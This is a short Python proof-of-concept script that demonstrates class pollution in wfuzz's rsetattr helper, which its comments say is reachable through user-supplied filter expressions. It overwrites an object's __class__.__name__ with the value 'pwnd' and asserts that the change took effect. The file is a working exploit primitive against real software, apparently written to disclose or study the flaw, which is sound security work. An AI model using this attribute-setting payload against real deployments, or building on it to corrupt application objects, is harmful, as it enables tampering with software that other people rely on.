# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: rsetattr (via filter expressions)
# Type: get-attr-set-attr
# Trigger: wfuzz -z ... --filter "r.attr.__class__.__name__:=pwnd"
#
# wfuzz filter expressions use rsetattr to set attributes on
# response/request objects based on user-provided filter strings.

from wfuzz.helpers.obj_dyn import rsetattr

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = "__class__.__name__"

def run_poc():
  rsetattr(target, PAYLOAD, payload_value, None)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
